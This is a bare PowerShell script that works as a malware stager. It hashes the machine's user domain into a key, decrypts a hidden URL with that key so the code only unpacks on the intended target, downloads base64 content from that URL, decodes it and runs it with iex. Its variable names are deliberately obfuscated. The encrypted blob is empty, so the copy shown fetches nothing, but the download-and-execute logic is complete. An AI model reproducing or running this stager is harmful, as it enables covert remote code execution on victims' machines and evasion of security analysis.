$blob = "";
$target = $env:USERDOMAIN;

$hasher = [System.Security.Cryptography.HashAlgorithm]::Create('MD5');
$hash = $hasher.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($target));
$hashString = [System.BitConverter]::ToString($hash).Replace('-', '');
$enc = [system.Text.Encoding]::UTF8;
$key = $enc.GetBytes($hashString);

$url = [Runtime.InteropServices.Marshal]::PtrToStringAuto([Runtime.InteropServices.Marshal]::SecureStringToBSTR((ConvertTo-SecureString -k $key $blob)));

$laksfnasf = (iwr $url -usebasicparsing).content;
$zxcasfasd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($laksfnasf));
iex $zxcasfasd;
